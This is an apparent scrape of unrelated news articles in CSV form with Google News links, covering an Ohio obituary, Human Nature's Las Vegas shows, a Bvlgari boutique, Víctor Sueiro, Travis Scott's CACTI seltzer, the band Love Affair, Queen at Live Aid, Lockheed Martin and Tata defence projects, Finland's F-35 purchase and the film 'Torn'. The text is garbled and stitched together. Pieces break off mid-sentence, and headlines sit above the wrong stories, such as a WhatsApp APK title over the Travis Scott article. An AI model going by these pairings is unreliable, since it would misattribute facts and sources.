Mr. Davis texted the I-Team saying he is finally doing the ""Happy dance.""",https://news.google.com/articles/CBMiMmh0dHBzOi8vd3d3LmV4YW1pbmVyLm9yZy9rYXRobGVlbi1lLWdyYW0tcmlja2V0dHMv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Kathleen E. 'Gram' Ricketts – Examiner Online,"Kathleen E. “Gram” Ricketts 99 passed away peacefully early Friday morning December 10 2021 at Logan Acres Senior Community in Bellefontaine Ohio.

Gram was born May 19 1922 to the late Forest and Lena (Pence) Comer in their home in rural Champaign County. She graduated from Zanesfield High School in 1940. In 1942 she married Myron Jay Ricketts who preceded her in death on November 30 2007. Gram was also preceded in death by two sons: Myron Dean in 1962 and Michael Keith (Vicky) in 2006; sisters: Imogene (Arthur) Clapsaddle in 2010 and Treva (George) Clapsaddle 2014; brothers: William (Sandy) in 1977 and Paul (Julie) in 2016.

Gram is survived by her son Ronald (DeeDee) Ricketts and daughter in law Vicky (Penhorwood) Ricketts; sister in law Sandy (Oder) Godwin; granddaughters Beth (Doug) Lantz Amy Ricketts Shelby (Matt) Haley Cori (Phillip) Morse; grandsons Matthew (Kim) Ricketts Jeff Ricketts; great grandsons Blake (Mackenzie) Lantz Oliver Morse; great granddaughters Brittany Lantz McKenzie Haley Kameren Haley and Jazmyn Haley; several nieces and nephews.

Gram worked for Eckrich and B & M handing out samples in local IGA and Kroger grocery stores. She was a long time member of Zanesfield United Methodist Church United Methodist Women and the Worthwhile Club of Zanesfield. She enjoyed traveling the United States and camping in a pop-up tent camper.

Gram was happiest when she was surrounded by family and friends and enjoyed it all the better when it was outdoors. She hosted countless campouts get-togethers Ricketts family reunions and Kroger employee picnics in the shelter house at “Idlenot Acres Farm.” There was almost always a cozy fire to gather around up on “the hill” and through all four seasons she delighted in the adventures that could be enjoyed by all – hunting morel mushrooms in the spring walks in the woods (Gram loved to explore the ravine with her grandchildren and taught them how to really appreciate nature) softball and wiffle ball games shuffleboard fishing in the pond (or ice skating and sledding when the weather turned) wiener roasts and so much more.

Gram enjoyed the simple pleasures too. She loved going to see her grandchildren’s sporting events. She enjoyed playing Euchre Yahtzee and working on puzzles. On Saturday evenings she had her music show with Marty Stuart. She enjoyed her flower gardens and her fish pond and seeing the interesting (and sometimes exotic) birds that would turn up at her numerous bird feeders. She loved exploring the farm on her golf cart. She loved mowing on her zero turn seeing everything look so nice and smelling the fresh cut grass. Gram’s favorite spot to go on the hill was “the rock.” She and Jay always loved the view from there.

Gram took great pride in being a homemaker and hostess. She was an excellent cook who loved to bake pies and breads for her family. She even hosted annual donut making parties at her house. But she especially enjoyed the traditional Christmas Eve dinners and other holiday meals that brought her big family together.

Gram welcomed everyone into her home with an open heart and we take comfort in knowing that she is now at peace surrounded by laughter and love.

A Funeral Service will take place Tuesday December 14 at 1 p.m. at Jennings Farley & Seeley Funeral Home & Crematory. Visitation will be from 11 a.m. until the time of the service. Burial will take place in Fairview Cemetery-West Liberty.

Human Nature the Australian vocal group that headlined on the Las Vegas Strip for 11 years until shuttering its residency show at the Venetian in 2020 is returning to the stage in Las Vegas next weekend. The group’s “Christmas Motown & More” shows at the South Point Showroom are sold out and set for 7:30 p.m. Dec. 16-19.

But the singing sensations will be a trio instead of a quartet. Human Nature has been a foursome since it was founded in 1989 as a doo-wop group in Sydney Australia singing on street corners in classic style.

“We’re calling it the new variant of Human Nature and we hope it will still be very potent” joked Andrew Tierney speaking on the phone last week from Minneapolis where he was performing with his brother Mike Tierney and Toby Allen.

Tierney explained that Phil Burton recently made the decision to move his family back to Australia and essentially step away from the group. “That’s what he wanted to do and we support him” he continued. “All four us put so much of our lives into Las Vegas and it has become our second home and we thought about it for a long time if we should try to replace Phil or go on with the three of us. We’ve got so much history together and we’ve been together for so long we decided to do that. So these Christmas shows have been a real discovery period for us and it feels good and the sound is strong [with three singers].”

Human Nature has never had a significant period performing as a trio. Over the pandemic travel and quarantine issues kept Allen offstage for a few shows but nothing else has kept this tight-knit group apart.

They are planning to reunite with Burton for an Australian tour set to kick off in April a logical decision given their massive popularity in their home country but Human Nature is making plans to be back onstage in Las Vegas on a regular basis next year and for that endeavor it will be down to the new trio.

“We’ll take it a step at a time and see where life takes us” Tierney said. “We’ve been talking about starting up a new residency in Vegas and with these shows at the South Point some people have asked why we don’t do it there. The fact that these shows sold out and people want us to consider coming back is such a great thing. We hope to be back and that will really color the next chapter of our career without Phil. It’s very much a new era.”

But next week is all about holiday tunes with a few of the group’s popular Motown covers and throwback hits thrown in for good measure. Human Nature released “The Christmas Album” in 2013 and will be cruising through many of those tracks at the South Point.

“It’s really the best mix of what we love to do and I particularly love Christmas music” Tierney said. “It was one of the first things we did together busking in Sydney during the holidays so we’re kind of going back to our roots in singing these songs.""",https://news.google.com/articles/CBMiTGh0dHBzOi8vc2VuYXR1cy5uZXQvYXJ0aWNsZS9idmxnYXJpLWZsYWdzaGlwLXN0b3JlLXNob3BwZXMtbWFyaW5hLWJheS1zYW5kcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Bvlgari Flagship Store Re-Opening Sees a Takeover of The Shoppes at Marina Bay Sands | SENATUS,"Text by Natalie White

The re-opening of Bvlgari's refurbished store in Singapore follows the majestic renovation of Rome London New York Hong Kong and other landmark locations with its interior design concept inspired by Mediterranean origins and Roman traditions coming together with the modern and vibrant location that is The Shoppes at Marina Bay Sands.

To celebrate Bvlgari's 130th anniversary the Italian jeweller's flagship store located at Via dei Condotti in Rome was transformed in 2014 by Peter Marino a celebrated American architect widely credited for redefining modern luxury retail. From the sunlight to the marbles the ancient buildings to the timeless city that is Rome Bvlgari's boutiques worldwide are nourished by deep Roman roots entrenched and inspired by rich history.

The Bvlgari Flagship Store at The Shoppes at Marina Bay Sands

Today transporting Rome to Singapore means conveying the Italian joy of living and taste for a ""good life"" in the boutique from the finest high jewellery masterpieces to Roman Aperitivo to sip in the lounge. An Italian touch infuses the 467 square metre space at Marina Bay Sands spanning two stories embodying a journey through Bvlgari's 2700 years of Roman history and inspiration. Ancient marbles and stones typical of Roman buildings are used in the design to express a classic geometry open to modern interpretation in a continuous interplay between innovation and tradition.

The store façade features a black Grand Antique marble portal used in contrast with Travertino Navona square columns with eye-catching coloured windows personalised with the holiday season's theme in a vibrant berry colour to attract clients.

The Bois Jourdan marble on the entrance's threshold welcomes the visitor and encompasses a design key element — the Condotti eight-pointed star in red porphyry.

A universal symbol of balance harmony and cosmic order the eight lines are symbolic of the four cardinal points (North South East and West) and time (two solstices and two equinoxes). As per the legend the star means ""Roma Caput Mundi"" — all routes lead to Rome. Part of the flooring inside the historic Bvlgari Condotti store in Rome the star is a unifying symbol found in all Bvlgari boutiques around the world. Adorned with Imperial Saffron shantung silk the iconic Condotti windows on the walls are a further reminder of the originals that are still present in the original historical flagship in Rome Condotti 10.

Entering the store is like a walk in the ancient city of Rome with the floor in a star-patterned white Travertino marble and oval-shaped counters in light galvanised iron. Inspired by the renowned Italian architect Carlo Scarpa. This is an invitation to browse the shop and to explore Bvlgari's most iconic collections. A magnificent chandelier inspired by Gio Ponti enlightens the product selections and the atmosphere.

In the rear portion of the shop is an oval private sales room inspired by the days Elizabeth Taylor visited Via del Condotti during the epic golden years of the Doke Vita while she was filming in Rome. The sliding door to the VIC features a Roman geometric pattern that echoes in the bronze latticework of the so-called Pantheon Mesh drawing inspiration from the Roman Pantheon to complement the eight-pointed star creating an iconic design and recalling Bvlgari's great Roman roots.

In a continuous tribute to Italian designers of the 30's the 50's and the 60's the space houses furniture conceived by contemporary Italian designers that remind of the work of their forerunners: product counters inspired by Carlo Scarpa sales tables in tribute to Franco Albini and Ico Parisi and the sofas referencing Osvaldo Borsani. The beauty of shapes the audacious combinations of materials and colours together with the excellence of Italian craftsmanship create a coherent link between the concept of the store and the trademarks of the brand shaping the house of the brand just like Bvlgari creates its jewels.

The brand DNA is further brought to life with a series of images paying homage to stars who have been admirers and ambassadors of Bvlgari over the years including artworks by Andy Warhol.

The refined balance between ancient and new tradition innovation and eclecticism defines the Bvlgari spirit and Peter Marino's concept. Expressed through the décor and furniture noble and classic materials such as bronze or marble are interpreted with a brave and modern twist.

In line with the grand reopening of the duplex boutique experience the Italian joy of life with a Bvlgari-branded takeover of the iconic building. From 21 November 2021 to 2 January 2022 exciting activations are set around the mall including a complimentary Sampan ride down the Bvlgari-branded Canal at The Shoppes and the gamification of the Bvlgari More Than A Wish holiday campaign 2021.",,,,,,,,,

Su deceso se produjo un día como hoy en el año 2007.

A los 16 años se inició periodísticamente en el diario El Mundo. En televisión fue recordado su trabajo en Teleshow y luego fue el acompañante de Tita Merello en Todo Tita & Terrabusi.

Víctor Sueiro trabajó desde siempre en los medios de comunicación y también incursionó en el cine y en el teatro como guionista y adaptador pero por sobre todo a partir de una experiencia límite se convirtió en uno de los escritores más leídos en Argentina.

En sus años de estudiante fue víctima de un tiroteo en la universidad que le ocasionó tres heridas de bala. Afortunadamente no se dañó ninguno de sus órganos vitales.

El 20 de junio de 1990 sufrió un vuelco en su extensa trayectoria mediática tras un paro cardíaco que lo tuvo clínicamente muerto por 40 segundos merced a lo cual salió gracias a la asistencia del equipo de cardiología del doctor Luis de la Fuente y después del cual publicó Más allá de la vida libro con ventas masivas en toda América Latina.

A lo largo de varios años tuvo que someterse a quince cateterismos y once angioplastias a manos de su amigo el doctor De la Fuente.

En 2003 volvió a la televisión después de trece años de ausencia como productor general y conductor de Misterios y milagros que tuvo un éxito impensado y se repitió al año siguiente.

También en 2003 recibió una distinción fuera de lo común: el Premio Juntos Educar que cada año desde 2000 otorga el Arzobispado de Buenos Aires a una docena de personas que con su trabajo colaboran con la educación y la cultura.",https://news.google.com/articles/CBMihQFodHRwczovL21hZy5lbGNvbWVyY2lvLnBlL2RhdGEveXgtd2hhdHNhcHAtZGVzY2FyZ2FyLWFway11bHRpbWEtdmVyc2lvbi1zbWFydHBob25lLTIwMjEtMjAyMi1pbnN0YWxhci1hcGxpY2FjaW9uZXMtbm5kYS1ubm5pLW5vdGljaWEv0gGFAWh0dHBzOi8vbWFnLmVsY29tZXJjaW8ucGUvZGF0YS95eC13aGF0c2FwcC1kZXNjYXJnYXItYXBrLXVsdGltYS12ZXJzaW9uLXNtYXJ0cGhvbmUtMjAyMS0yMDIyLWluc3RhbGFyLWFwbGljYWNpb25lcy1ubmRhLW5ubmktbm90aWNpYS8?hl=en-US&gl=US&ceid=US%3Aen,YX WhatsApp: dónde descargar el APK y cómo instalarlo,"WhatsApp está integrando nuevas funciones a su plataforma para smartphones como es el caso de los mensajes que desaparecen en 24 horas una vez que son leídos.

Anheuser-Busch announced on Friday that the ""Sicko Mode"" rapper's brand of spiked seltzers will no longer be sold in stores.

The brand's Instagram and Twitter accounts have also been shuttered.

​""After careful evaluation we have decided to stop all production and brand development of CACTI Agave Spiked Seltzer. We believe brand fans will understand and respect this decision"" an Anheuser-Busch spokesperson tells Fox Business.

ASTROWORLD TRAGEDY: TRAVIS SCOTT DRAKE APPLE AND LIVE NATION HIT WITH $750M LAWSUIT

A spokesperson for Scott described the shuttering to FOX Business as a ""pause."" The spokesperson said it was mutually decided upon by both parties and that the deal expired on Nov. 30. They insist it is not a cancelation or ceasing of an ongoing agreement. The news comes just days after Scott conducted his first sit-down with Charlamagne Tha God about the Astroworld Festival tragedy.

""Travis was clear in his interview that he is not focused on business right now and his priority is helping his community and fans heal. CACTI asked AB Inbev to inform their wholesalers there will not be product at this time"" the spokesperson said.

The development comes at a time when hard seltzers are seeing a drop in demand.

Back in September Boston Beer Co. said in July it had overestimated demand for its hard seltzer brand Truly in anticipation of the summer. At the time Boston Beer said its outlook for hard seltzers in the second half of 2021 was uncertain and lowered its earnings forecast.

Scott first debuted Cacti in March after teaming up with McDonald’s for his namesake meal — an item that caused ingredient shortages at locations across the country.

The rapper also known as Cactus Jack lent his nickname to the spiked seltzer which was made with blue agave from Mexico. The drink contained 7% ABV and came in three flavors: pineapple strawberry and lime. Each can is made with water cold fermented cane sugar and agave syrup.

""Finally getting CACTI out into the world and into the hands of fans is a surreal moment for me and the team"" Scott said in a statement that coincided with the drink's announcement via a television commercial that aired during Sunday's Grammy Awards. ""This has been something I had a strong vision for and have wanted to do for a while. It was important to me to be heavily involved in the entire creative process; from the flavor obviously to the can design packaging and the entirety of the brand world we’ve built. I sought to create a beverage brand that was unlike others in the market.""

We got nicked bailed and by the time we got to court we were all over the papers."" The band were each fined £12 for breach of the peace and bound over for a year. ""But the record shot straight up to number one!"" says Steve. ""Talk about in at the deep end!"" That eternal classic Everlasting Love topped the charts for two weeks in February 1968. Top Ten hits Rainbow Valley and A Day Without Love followed quickly. That year only the Beatles sold more singles than Love Affair. ""We got dragged off to Carnaby Street and told we'd be wearing frilly shirts and satin velvet trousers on Top Of The Pops"" Steve recalls. ""But we were mods and these were hippy clothes.

Love Affair were proper North London mods fuelled by a love of black American soul. ""My mum used to save Green Shield stamps to buy me Ray Charles albums"" Steve recalls. ""When we formed our band the Soul Survivors we went and saw James Brown at Walthamstow Granada. He blew our socks off he was phenomenal. I thought that's how a singer has to be so I started doing gymnastics."" Now plagued with knees problems he adds ruefully ""You could scoot across the stage on your knees at that age and it didn't hurt."" ""It helped that Steve possessed one of the great white soul voices.The five-piece Soul Survivors played anywhere - youth clubs school discos ""we'd gatecrash gigs and even weddings saying 'We're the band you booked'. We'd try anything. ""Because the others were Jewish we got a shout for a bar mitzvah - they wouldn't pay us but they gave us loads of food."" Their first manager was drummer Maurice Bacon's father a handbag magnate who let them rehearse in his Tottenham warehouse.

They graduated to mod clubs in Clacton and Brighton and soul clubs in Stoke and Manchester. Steve was 15 when they played Soho's legendary Flamingo. """"he manager said 'Tell everyone you're 19 or we'll lose our licence'"" Steve laughs. ""We'd get home at 4am and get up for school the next day ."" ""Residences there and at the Marquee followed. ""We played at the Goldhawk withThe Who and the Small Faces at the Albert Hall. It was a benefit for the Aberfan disaster and Dorothy Squires was on the bill. ""When we played she came on and slapped a mod girl around the face. They dragged her off stage. It was a bizarre night!"" ""Steve was still 16 when Decca Records signed them.They changed their name to Love Affair but their first single the Jagger/Richards song She Smiled Sweetly flopped. ""I was glad - I hated it"" says Steve. Decca dropped them and CBS swooped in. Ellis had been working part-time at the Co-op but moved on to a six-month apprenticeship on a building site. ""I asked the Scottish foreman for a day of. f. He said 'What for laddie?' I said 'I've gotta make a record mate' and that was Everlasting Love.""

English pop and soul group Love Affair in London 1967.

Still kids they sabotaged Maurice's drum stool on Top Of The Pops replacing the bolts with matchsticks so when he sat down it collapsed under him. ""Imagine doing that now! Health and Safety would be on you like a ton of bricks!"" They tried to prank Val Doonican on his TV show too. ""We got his rocking chair and made it so it'd fallflat if he sat on it but he caught us red-handed?"" At Kettering two female fans got hold of Steve's trousers while he was singing one leg each and pulled. ""I was left standing there in me pants? It all felt surreal but we worked hard we toured the country slept in the van; we sometimes played three one-hour sets a night."" There were problems though. When the band recorded Everlasting Love a US hit for soul singer Robert Knight their management wasn't satified. Steve says ""I was told to go to CBS studios where I found a 40-piece orchestra waiting for me."" ""Other Love Afair A-sides were recorded similarly just Steve an orchestra and a brass section. ""Live it was a pain because we couldn't recapture that sound."" And the rest of the band who only played on the B-sides resented it. Then Jonathan King outed them for it. ""It was common practice back then but it made all the papers. What a stink.""

Steve Ellis fronted the successful band.

He shakes his head. ""Live we kicked a***."" Steve's mother disapproved for other reasons. Even at the height of his fame she scolded him saying ""You could have been managing the Co-op."" ""Love Afair had more hits in 1969 - including Bringing On Back The Good Times - but never topped their first. Ellis quit in 1970 to pursue a solo career. ""The band wanted to go progressive rock and that wasn't for me. I'd always been a soul-boy. The main reason we broke up though was the screaming. We couldn't hear what we were playing. It wasn't music any more just madness'."" Steve made his first solo album recorded the soundtrack for the 1970 film Loot and then formed Ellis with Zoot Money - ""commercial suicide?"" Mid-70s rock band Widowmaker fared better but by 1981 he'd left the business and was working at Shoreham Docks until his feet were crushed by a forklift truck. It took eight years of operations and therapy to fully recover. Ellis took up karate to rebuild his strength.

Over the weekend Sting sat down with Dermot O'Leary for a nostalgic look back through his career broadcast as part of Reel Stories on BBC2. One section revisited the extraordinary scenes at Live Aid on July 13 1985 when most of the biggest names in music came together for an extraordinary charity concert. While they were watching clips from the day Freddie Mercury came up on the screen and the Police icon gave a heartfelt and powerful tribute to the much-missed star.

Sting admitted that even though he is a major global star himself it was still ""blowing my mind"" watching the line-up on the day. He also added: ""So many people no longer with us."" Asked what his main memory was from Live Aid he said: ""I enjoyed it. After I’d sung I had a ball watching everyone do their thing."" And then he revealed who he thought was the best act on a day that included (on both sides of The Atlantic) David Bowie Elton John Madonna The Who George Michael and his own band The Police.

Freddie and Queen's set at Live Aid went down in history and then was immortalised all over again when it was recreated in the Oscar-winning film Bohemian Rhapsody with Rami Malek. However the movie also reignited discussions over whether Queen had somehow ""cheated"" by ""turning up"" the monitors on the sound desk so they were louder than anyone else. DON'T MISS

READ MORE Freddie Mercury stroked his favourite cat at the end: Final photo The idea is that long-time engineer Trip Khalaf 'cheated' with a sneaky trick. Even Brian May said: ""We sent our brilliant engineer to check the system so he set all the limiters for us. We were louder than anyone else."" The man in charge of the sound for the whole stadium on the day says it was completely impossible. So what really happened? Malcolm Hill's company Hill Pro Audio installed all the sound systems at Wembley Stadium for Live Aid. His company even received a formal letter from the Greater London Council commending them for maintaining the strict sound levels put in place.

He told Express Online: ""Nobody on or around the stage would have had any control of or even knowledge of the sound system operation... The system was controlled by a 'processor rack' 100 metres away in the middle of the pitch tucked out of the way to the side of the mix platform."" Basically it was impossible for anyone to increase the sound limit. In layman's terms Queen weren't actually any louder but they sounded louder. Queen did sound better than most of the other bands at Wembley for two very impressive reasons.

Freddie Mercury and Brian May at Live Aid

Firstly Queen's talented sound engineer was one of the few who knew how to properly maximise the output within the limits so Queen sounded clearer and louder. Brian May was correct when he said Trip made them sound louder. Hill explains: “Trip Khalaf from Queen wasn’t phased by anything. He just walked up to the mixing desk he’d never seen before in his life set it all up and the rest is history. You wouldn't be able to launch Bohemian Rhapsody if their set (sound) hadn’t been massive."" There was one other factor of course which really set Queen apart and above the rest.

The NGI is a missile defense interceptor program designed to protect and defend the U.S. from intercontinental ballistic missiles. This program will serve as a first line of a layered missile defense architecture against evolving threats from rogue nations.

Valley Tech Systems will provide a solid-propulsion roll control subsystem to assist in stabilizing the NGI’s flight trajectory. Under the subcontract for the technology development and risk reduction phase Valley Tech Systems will deliver a flight-qualified production-ready subsystem to Lockheed Martin in support of the 2027 fielding date.

Valley Tech Systems’ controllable solid-propulsion technology regulates the use of solid propellant to achieve required levels of precision and long-duration operation while offering superior reliability safety and affordability. The company developed the technology under a series of Small Business Innovation Research (SBIR) contracts from the MDA and the U.S. Air Force with Lockheed Martin as its commercialization and technology transition partner. Derivations of the technology also are under development for future application to U.S. Air Force U.S. Army and U.S. Navy missiles through additional SBIR contracts.

“By including our cutting-edge technology in the NGI program Lockheed Martin is tapping into American ingenuity while expanding the defense industrial base and Lockheed Martin’s supply chain” said Russell Carlson vice president Aerospace Division Valley Tech Systems. “In transitioning from R&D to weapon system integration we have upgraded our business systems and engineering processes to successfully achieve the stringent technical and quality program requirements of Lockheed Martin and the MDA",https://news.google.com/articles/CBMiXGh0dHBzOi8vd3d3Lm9jYWxhLW5ld3MuY29tLzIwMjEvMTIvMTEvcmFpbmJvdy1vdmVyLWxvY2toZWVkLW1hcnRpbi1pbi1zaWx2ZXItc3ByaW5ncy1zaG9yZXMv0gEA?hl=en-US&gl=US&ceid=US%3Aen,Rainbow Over Lockheed Martin In Silver Springs Shores,"Check out this gorgeous rainbow that formed over Lockheed Martin in Silver Springs Shores.

TASL the wholly-owned subsidiary of Tata Sons has grown rapidly in less than a decade focusing on providing integrated solutions for aerospace defence and homeland security. It has now grown its capabilities throughout the entire aerospace value chain from design to whole aircraft assembly as evidenced most recently with the Airbus C295 order from the Ministry of Defence.

The manufacture of the wing of a high-performance fighter aircraft is another feather in the cap for TLMAL which can now compete for global F-16 fighting wing orders with other Lockheed Martin suppliers.

Sukaran Singh MD and CEO TASL said “The successful completion of the fighter wing shipset prototype project is another achievement added to the partnership between Tata Advanced Systems and Lockheed Martin. With this TLMAL creates a new benchmark in complex and end-to-end defence manufacturing in India that demands utmost precision and quality in all aspects of the process.”

Speaking to Mobility Outlook on the sidelines of the qualification event for the F-16 wing earlier this week Singh said that the Tata Group had decided to proceed with F-16 wing production by TLMAL even without an order as it was keen to grow its capability to manufacture increasingly complex aerostructures.

With the Government focused on greater in-country manufacture of defence equipment the ability to manufacture F-16 wings in India could further boost Lockheed Martin’s offer of the F-21 (a derivative of the F-16) to meet an IAF requirement for 114 new fighter aircraft.

F-16 wing production in India however is not contingent on the F-21 being selected to meet the IAF requirement. Lockheed Martin is facing resurgent demand for the latest version of the new F-16 Block 70/72 which five nations have already ordered.

At present wings for the new production F-16s are built by Israel Aerospace Industries (IAI) which restarted production in September this year. The Israeli firm reactivated an assembly line it had first established in the 1980s. After manufacturing the F-16 wings IAI transports them to Lockheed Martin’s final assembly line in Greenville South Carolina USA.

IAI also produces outer wing boxes for the F-35 5th generation fighter which Lockheed Martin builds along with wings for the T-38 jet trainer.

Structural Shift

A fighter wing is one of the most technologically complex aerostructures to manufacture. “Through this prototype project TLMAL demonstrated their manufacturing capabilities & also met Digital Engineering requirements through Wing digitisation” said Aimee Burnett Lockheed Martin Vice President Integrated Fighter Group Business Development.

Unlike the other aerostructures supplied by TLMAL the fuel-carrying F-16 wing is interchangeable/replaceable that can sustain loads of 9G (nine times the force of gravity) and has a 12000-hour service life. The successful qualification of the first prototype wing manufactured at TLMAL’s Hyderabad facility showcases its capability to perform detailed part manufacturing and deliver a fully compliant representative fighter aircraft wing shipset.

Since the F-16 has a “wet” wing (a wing with fuel inside) the wing leak test was an extremely challenging test to clear especially considering the G loads that the wing will experience in operational service. “The team got significant appreciation from Lockheed Martin for passing the very complex ‘Wing Leak’ test the first time right along with the product quality that we have delivered” said Masood Hussainy Head Aerostructures and Aero-Engines Tata Aerospace and Defence. Also utilised for the F-16 wing manufacture was India’s first state-of-the-art metal-to-metal bonding facility which was established on TLMAL’s premises in April 2018. The 4700 square-meter facility enhanced TASL’s capability to manufacture complex aero-structures.

TASL and Lockheed Martin decided to partner together to produce F-16 fighter wings in India for export in September 2018 and both firms worked hard to qualify several Indian companies for the programme resulting in over 70% of the detailed parts now being sourced locally. Among these suppliers is Lakshmi Machine Works the first Indian private sector firm to supply a 9G capable aerostructure for the programme. Other qualified suppliers include Azad Engineering Tata Sikorsky Aerostructures Rangsons Aerospace Rossel Techsys and Vijayant Metal Finishers.

Industrial Powerhouse

TLMAL was established in 2010 and is the global single-source supplier of C-130J empennage assemblies. These empennages which consist of the whole tail unit of the aircraft are installed by Lockheed Martin on all-new Super Hercules aircraft (including those already in service with the IAF). TLMAL has delivered nearly 160 C-130J empennages to date and can produce 24 C-130 empennages annually. TLMAL has also indigenised its C-130 manufacturing by transitioning the production of approximately 2000 previously imported empennage parts to Tata Sikorsky Aerospace another Tata-Lockheed Martin joint venture located here.

The Tata Group’s Aerostructures and Aero-Engines business now come under Tata Aerospace and Defence formed after amalgamating various Tata companies in the Aerospace and Defence sector with more than 4000 employees. Tata Aerospace and Defence counts six of the top ten aerospace firms globally as its customers and is the global single-source supplier for 20 major aircraft programmes including the Airbus A320 Boeing 787 Lockheed C130 J Boeing AH-64E Apache Helicopter and Sikorsky S 92 Helicopter. It also supplies complex aero-engine parts to General Electric and Rolls Royce.",https://news.google.com/articles/CBMiU2h0dHBzOi8vYWxsZWFycy5uZXQvMjAyMS8xMi8xMS9uZXdzLXVuaXZlcnNhbC1vcmxhbmRvLWJ1eXMtbGFuZC1mb3ItbmV3LXRoZW1lLXBhcmsv0gEA?hl=en-US&gl=US&ceid=US%3Aen,NEWS: Universal Orlando Buys Land for New Theme Park,"Epic Universe is Universal Orlando’s next major project expected to open in 2025 with a theme park shopping & dining district and hotels.

Earlier this year Switzerland had decided to buy the American fifth-gen stealth jet in a $5.5 billion contract.

Finland picked the Lockheed Martin F-35A aircraft from a lineup of five finalists including the Boeing F/A-18E/F Super Hornet France’s Dassault Rafale Eurofighter Typhoon and Sweden’s Saab Gripen.

Finland Selects the F-35 The Finnish government chose the F-35 as the winner of the HX Program. By selecting the F-35 Finland gains a significant capability to ensure stability in the region. pic.twitter.com/mcjY5WMm1z — F-35 Lightning II (@thef35) December 10 2021

The government has authorized the Finnish Defense Forces Logistics Command to ink a deal with the United States for Finland’s next multi-role fighter according to a news release published by the Air Force. The F-35A Lightning II will replace Finland’s present fleet of F/A-18 Hornets.

The contract covers 64 F-35A Block 4 multirole aircraft a large and diverse armament package essential training and maintenance solutions as well as other relevant equipment and sustainment services through the end of 2030.

Following a six-year tendering process the country decided to choose American jets. During the process the jets were assessed for their capacity to operate in Arctic circumstances and other core areas including military capability security of supply industrial cooperation and procurement and life-cycle costs.

The combat reconnaissance and survivability attributes of the F-35 set it apart from the other HX program competitors. The existing Hornet fleet will enter the decommissioning phase from 2025 onwards and the first F-35 will be delivered to Finland in 2026.

Finland claims that the F-35 is the best option due to the country’s harsh operating conditions which include widespread operations from highway strips. The Finnish Air Force regularly conducted exercises using highways as runways to prepare for the worst-case scenario.

Lockheed Martin’s Package

The performance of the F-35 system was best matched to the Finnish operating environment and HX requirements. The aircraft ranked first in the evaluation in all mission areas by getting the highest overall score.

The Air Force praised the F-35’s situational awareness and capacity to exchange targeting data with other platforms as well as its stealth qualities and sensors which are entirely inside rather than external.

Moreover its technological solution is sustainable and has the best growth potential among all competitors. The contract covers the multi-role fighters’ weaponry which includes the AMRAAM Sidewinder SDB I and II JDAM family armament JSM and JASSM-ER. By the end of 2035 the weapons will be procured within the availability of program funds.

The weapon package can be optimized throughout the purchase process considering the availability of the latest weapon types and adjustments within the operating environment.

The F-35’s combat survival is aided by its stealth and other unique features such as sensors and networked operation capability. The aircraft also has the largest internal fuel capacity and does not need external fuel tanks which helps it to stay in the air for a longer time.

A significant number of additional products and services can be concurrently acquired in connection with the acquisition of the combat system. These include maintenance systems including test equipment tools assembly services and spare parts information systems training and service systems mission support systems and related services.

How F-35 Outperformed Its Rivals?

The F-35 won the Finish HX competition because it achieved the major decision parameters of supply security industry participation and cost. Furthermore in the capability evaluation the F-35 had the highest operational effectiveness and the largest potential for future growth.

Finland’s national supply security criteria are also met with the F-35 solution. The maintenance of the system is based on the F-35 global maintenance solution which has been customized to fulfill national supply security requirements.

The F-35 package appears to have been deliberately customized by Lockheed Martin and the US government to suit Finnish security of supply needs.

The defense forces and national industrial entities will build critical maintenance capabilities. The solution includes maintenance capabilities that will be produced in Finland as well as spare parts and replaceable assemblies that will be under Finland’s exclusive national authority in the event of an emergency as well as participation in the global maintenance network.

The F-35 option was found to be the most cost-effective when matched to the assigned financial framework. When all parts of the offer are considered the F-35 has the lowest acquisition cost.

A final engine assembly project for Finnish aircraft is also being proposed in Finland as part of an industrial cooperation agreement to be reached between the Finnish Ministry of Defense Lockheed Martin and engine maker Pratt & Whitney.

Chief of @FinnishAirForce @JokinenPasi says in capability scoring F-35 achieved 4.47 (where 4.0 was requirement) next best got 3.81.

The operational facilities hangars runway structures and procured system infrastructure will be built in the country. The technological and economic grounds for these provide Lockheed Martin an edge over other competitors in Finland’s HX program.

Considering the long land border with Russia this aircraft will provide strong deterrence power to Finland. Moreover this procurement will put Finland close to the US and its allies ensuring the best possible way to counter potential aggression by Russia.

Meanwhile Switzerland’s decision to buy the American fifth-generation stealth jet in a $5.5 billion deal is under scrutiny after a Swiss parliamentary committee announced that it would review the proposal."

IF YOU GO … What: ‘Torn’ at Aspen Film Academy Screenings Where: Wheeler Opera House When: Monday Dec. 13 5 p.m. How much: $25 Tickets: Wheeler box office; aspenshowtix.com

Max Lowe was 10 years old when his dad the superstar mountaineer Alex Lowe died in an avalanche on an expedition in Tibet in October 1999.

Alex’s best friend and climbing partner Conrad Anker went on to marry Alex’s widow and raise Max and his two brothers sons. Now a filmmaker Max used his camera as a therapeutic tool for himself and the family attempting to reckon with the trauma of their loss in intimate interviews and by digging through Alex’s archives at their Bozeman home.

The result is “Torn” a revelatory and radically intimate documentary that will screen Monday at Aspen Film’s Academy Screenings. Produced by National Geographic the film has been touring it across the U.S. since the Telluride Film Festival and recently had its theatrical premiere in New York.

The Lowes and Anker were finally able to recover Alex’s remains from the avalanche site on Shishapangma in 2016. But the process didn’t provide closure Max Lowe recalled in a recent video interview. Instead it had the opposite effect and led him to work through his trauma with his family on film.

“If anything it opened the door for me” Lowe said. “That’s what made making ‘Torn’ even fathomable for me. If that had not happened I probably never would have delved into any of this stuff in my life. It’s been a wild journey working through all of it in this way.”





Lowe looked to documentaries like Sarah Polley’s “Stories We Tell” and Bing Liu’s “Minding the Gap” as his cinematic polestars tossing out the idea of objectivity and instead placing viewers in his perspective as he tells his story.

“I was inspired by other filmmakers who had taken that leap in vulnerability and put themselves within the stories they’re telling in this way” Lowe said.

The camera and the interview process created a space for he and his mom and Anker and his brothers to talk in a way they never had before he found.

“It’s movie magic” Lowe laughed. “You have this greater purpose. … When you’re sitting down to tell a story and place yourself in it it gives you this allowance to be vulnerable.”

Anker clearly wanted to use the filmmaking process to open up and attempt to heal his fraught relationship with Max. “Torn” shows him sitting for his first interview with Max closing his eyes and taking a long deep breath. He then opens his eyes and says “Let’s do this!”

“Honestly I was most concerned about his interview” Lowe said. “I didn’t know if he would open up. Because that’s not really his character. To have him be brave enough and love me enough to sit down and open up in the way that he did was really special.”

